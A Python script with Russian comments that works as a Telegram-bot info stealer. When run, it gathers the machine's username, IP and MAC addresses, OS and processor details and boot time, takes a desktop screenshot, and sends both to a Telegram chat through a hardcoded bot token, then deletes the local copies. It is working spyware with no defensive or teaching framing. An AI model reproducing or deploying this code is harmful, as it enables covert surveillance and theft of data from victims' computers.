import telebot
from datetime import datetime

import getpass
import os
import socket
from uuid import getnode as get_mac
import pyautogui
# import speedtest
import psutil
import platform
from PIL import Image

bot = telebot.TeleBot("5721458659:AAEPnYmZTy4LJap8M__AngXbyGj7ZwSRFjo")
start = datetime.now()
# Информация о пользователе
name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()
# Информация о скорости интернета
# inet = speedtest.Speedtest()
# download = float(str(inet.download())[0:2] + "." + str(round(inet.download(), 2))[1]) * 0.125
# uploads = float(str(inet.upload())[0:2] + "." + str(round(inet.download(), 2))[1]) * 0.125
# Часовой пояс и время
zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)
# Чатсота процессора
cpu = psutil.cpu_freq()

# Скриншот рабочего стола
os.getcwd()
screen = pyautogui.screenshot("screenshot.jpg")

file = open("info.txt", "w")
file.write(f"[============================================]\n Operating System: {ost.system}\n Processor: {ost.processor}\n Username: {name}\n IP adress: {ip}\n MAC adress: {mac}\n Timezone: {time.year}/{time.month}/{time.day}||{time.hour}:{time.minute}:{time.second}\n Current Frequency: {cpu.current:.2f} Mhz\n[============================================]\n")
file.close()

# try:
#     os.chdir(r"/temp/path")
# except OSError:
@bot.message_handler(commands=['start'])
def start_message(message):
    upfile = open("info.txt", "rb")
    uphoto = open("screenshot.jpg", "rb")
    bot.send_photo(message.chat.id, uphoto)
    bot.send_document(message.chat.id,upfile)
    upfile.close()
    uphoto.close()
    os.remove("info.txt")
    os.remove("screenshot.jpg")
    bot.stop_polling()
bot.polling()
raise SystemExit


ends = datetime.now()
workspeed = format(ends - start)

